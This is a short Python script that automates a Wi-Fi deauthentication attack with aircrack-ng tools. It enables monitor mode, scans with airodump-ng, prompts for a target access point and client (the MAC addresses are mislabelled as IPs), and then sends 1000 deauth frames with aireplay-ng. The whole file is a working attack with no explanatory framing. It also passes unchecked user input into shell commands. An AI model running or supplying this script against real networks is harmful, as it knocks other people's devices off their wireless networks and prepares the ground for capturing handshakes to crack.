import subprocess
airmon_cmd = f"sudo airmon-ng start wlan0"
subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airmon_cmd])
temp = input("Press Enter after monitor mode enabled.....")
airodump1_cmd = f"sudo airodump-ng wlan0mon"
z=subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump1_cmd])
router_ip = input("Enter Router IP: ")
channel = input("Enter Channel: ")
z.terminate()
airodump_cmd = f"sudo airodump-ng --bssid {router_ip} --channel {channel} wlan0mon"
zz= subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
target_ip = input("Enter target IP: ")
zz.terminate()
airodump_cmd = f"sudo iw dev wlan0mon set channel {channel}"
subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
airodump_cmd = f"sudo airodump-ng --bssid {router_ip} --channel {channel} wlan0mon"
subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
aireplay_cmd = f"sudo aireplay-ng --deauth 1000 -a {router_ip} -c {target_ip} wlan0mon"
subprocess.run(aireplay_cmd, shell=True)




